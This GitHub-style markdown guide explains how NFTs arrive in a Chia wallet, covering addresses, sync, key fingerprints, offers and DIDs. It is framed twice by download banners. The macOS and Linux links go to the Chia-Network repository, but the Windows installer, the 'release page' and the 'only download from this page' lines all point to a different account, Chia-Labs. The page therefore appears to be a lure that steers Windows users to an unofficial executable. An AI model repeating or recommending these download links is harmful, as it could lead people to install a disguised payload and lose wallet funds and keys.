<div align="center">

![Chia Wallet](../assets/banner-article.png)

</div>

<h1 align="center">Receiving NFTs in Chia Wallet</h1>

<p align="center">CATs, offers and NFTs, explained in order.</p>

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

Receive an NFT by giving the sender your `xch1` receive address: NFTs arrive at the same address as XCH and CATs. The NFT then appears in the wallet's NFT section once the wallet has synced. If a sent NFT does not appear, the cause is usually sync, the wrong key, or a trade that was never completed rather than a lost token.

## How an NFT arrives

An NFT is a Chia asset with its own identifier, transferred like a coin to a puzzle hash. Your address is that puzzle hash, so an NFT sent to it belongs to the key behind it. There is no separate NFT address and nothing to register in advance.

The wallet finds NFTs by scanning the chain for its own puzzle hashes. That is why delivery is not instant in the way a message is: the wallet has to reach the block containing the transfer. [The Chia Wallet data folder](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/where-chia-wallet-data-lives.md) explains the scan it performs.

## Receiving, step by step

1. Confirm the wallet is synced.
2. Open the receive screen and copy the address.
3. Send the address to whoever is transferring the NFT.
4. Wait for their transaction to confirm and for your wallet to sync past it.
5. Open the NFT section and confirm the item appears with its identifier.

For a trade rather than a gift, the safer route is an offer: the NFT transfers only if both sides settle. [Creating a chia offer in Chia Wallet](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/create-a-chia-offer-safely.md) covers that path, and it avoids the trust problem of sending first.

## Why an NFT does not appear

<div align="center">

| Symptom | Cause | Fix |
| --- | --- | --- |
| Nothing in the NFT section | Wallet still scanning | Wait, or check sync |
| NFT appears under another key | Different key selected | Switch key by fingerprint |
| Offer completed, no NFT | Offer never taken, or wrong asset | Check the offer status |
| NFT shows but cannot be sent | Wallet behind on state | Resync |
| Item looks unfamiliar | A different NFT than expected | Compare the identifier |

</div>

The fourth row is worth attention: a wallet that is behind can show an NFT it cannot yet spend, because spending needs up-to-date coin state. It resolves with a sync rather than with any repair.

## "The wallet says this NFT is not mine"

An ownership warning appears when the wallet's record of an NFT disagrees with the chain: the NFT may belong to a different key, or the wallet's data may be stale. The first check is the fingerprint, because a second key in the same installation is the common case.

If the fingerprint is right and the warning persists, resync so the wallet re-derives ownership from the chain. [Rebuilding the database](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/repair-a-corrupt-chia-wallet-database.md) is the procedure, and it is safe: the NFT itself is on chain, not in your wallet file.

## NFTs, DIDs and identity

An NFT can carry a DID, which ties the token to a decentralised identity you control. That link is what makes some NFTs verifiable as belonging to a collection or a creator. [What a Chia DID is](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/what-is-a-chia-did.md) covers the identity side; the NFT page only needs to know that a DID does not change how the token arrives.

## What an NFT record actually holds

An NFT on Chia is a coin with data attached: an identifier, a set of URIs pointing at the content, and a record of who may update it. The wallet reads those fields and displays them, which is why an NFT with a broken content link still shows as a token even when the image does not load.

That distinction matters when something looks wrong. A missing image is a content-location problem; a missing token is a sync or ownership problem. Only the second is about your wallet.

## Moving an NFT on

Sending an NFT is a transfer like any other asset, and it uses the same address format. The recipient must be able to see it, which means their wallet must be synced and their key must be the one you sent to. Selling through an offer is the safer route when the counterparty is not known to you.

Keep the NFT's identifier in your records. Names and images can be copied; the identifier cannot, and it is how a collection or a marketplace verifies which token is which. [The Chia Wallet send guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/how-to-send-xch-from-chia-wallet.md) covers the transfer mechanics.

## Keeping the wallet able to see everything

Run the current release from the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5), because NFT display and handling have been revised across releases - a large collection in particular is handled better by current builds. [The Chia Wallet update guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/update-chia-wallet-to-current-release.md) is one download, and whether the wallet is safe covers the rest of the picture.

If you hold many NFTs, expect the wallet database to be larger and the first scan to take longer. That is size rather than damage, and where the data lives explains the growth.

## Frequently asked questions

### How do I receive an NFT in my wallet?

Give the sender your `xch1` receive address. The NFT appears in the NFT section once your wallet has synced past the transfer.

### Why is my NFT not showing in the wallet?

Usually the wallet is still scanning, a different key is selected, or the offer that was meant to deliver it was never completed.

### Why does the wallet say an NFT is not mine?

Its record disagrees with the chain, often because another key in the installation owns it. Check the fingerprint, then resync.

### Can I receive an NFT to the same address as XCH?

Yes. An address identifies your key rather than an asset type, so a token or an NFT lands wherever XCH lands.

### Do I need to add anything before receiving an NFT?

No. Unlike a CAT, an NFT does not need to be added by identifier before it can arrive.

---

## Download Chia Wallet

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

## Related guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Offer expired or not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) | The 7-day default, the fee at take time and the trade that lapsed. |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Send a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) | Sending a token rather than XCH, and the fee that still applies. |

</div>
